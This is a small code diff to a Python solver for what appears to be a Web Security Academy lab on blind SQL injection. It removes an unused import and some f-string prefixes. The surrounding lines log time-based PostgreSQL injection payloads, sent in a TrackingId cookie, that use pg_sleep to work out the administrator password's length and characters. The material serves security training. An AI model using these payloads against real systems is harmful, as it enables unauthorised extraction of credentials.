@@ -1,5 +1,4 @@
 from web_security_academy.core.logger import logger, NoNewline
-from bs4 import BeautifulSoup
 
 import string
 import time
@@ -7,7 +6,7 @@ import time
 
 def solve_lab(session):
     logger.info(
-        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
+        'Determining the length of the administrator password by visiting "/" with the following cookies:'
     )
     logger.info(
         '{"TrackingId": "\' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
@@ -33,7 +32,7 @@ def solve_lab(session):
                 break
 
     logger.info(
-        f'Determining administrator password by visiting "/" with the following cookies:'
+        'Determining administrator password by visiting "/" with the following cookies:'
     )
     logger.info(
         '{"TrackingId": "\' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
